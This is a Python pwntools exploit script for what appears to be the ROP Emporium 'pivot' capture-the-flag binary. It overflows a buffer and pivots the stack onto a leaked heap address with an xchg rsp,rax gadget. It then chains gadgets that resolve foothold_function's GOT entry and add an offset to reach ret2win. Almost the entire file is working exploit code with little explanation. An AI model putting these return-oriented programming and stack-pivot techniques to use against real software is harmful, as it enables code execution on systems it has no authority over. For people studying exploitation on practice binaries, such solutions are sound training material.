#!/usr/bin/python3
import pwn
offset=0x20+8
rop_chain=b''
#Notice that foothold_function() isn't called during normal program flow, you'll have to call it first to update its .got.plt entry.
rop_chain+=pwn.p64(0x0400720)#foothold_function@plt
rop_chain+=pwn.p64(0x4009bb)#pop rax;ret
rop_chain+=pwn.p64(0x601040)#foothold_function@got_plt
rop_chain+=pwn.p64(0x4009c0)# mov rax,qword [rax];ret
rop_chain+=pwn.p64(0x04007c8)#pop rbp;ret
rop_chain+=pwn.p64(0x0a81-0x096a)#ret2win-foothold_function
rop_chain+=pwn.p64(0x4009c4)# add rax,rbp;ret
rop_chain+=pwn.p64(0x04006b0)# call rax

target=pwn.process("./pivot")
gdbscript = "b *0x4009bb\n"
gdbscript+="b *0x0400720\nb *0x04006b0\nb *0x4009c0"
target.recvuntil("pivot: 0x")
heap_addr=target.recv(12).decode()
pwn.log.info('Heap: 0x'+heap_addr)
target.sendline(rop_chain)

heap_addr=int(heap_addr,16)
stack_pivot =pwn.p64(0x4009bb)#pop rax;ret
stack_pivot+=pwn.p64(heap_addr)
stack_pivot+=pwn.p64(0x4009bd)#xchg  rsp,rax
pid = pwn.gdb.attach(target, gdbscript=gdbscript)
target.sendline(b"A"*offset+stack_pivot)

target.interactive()
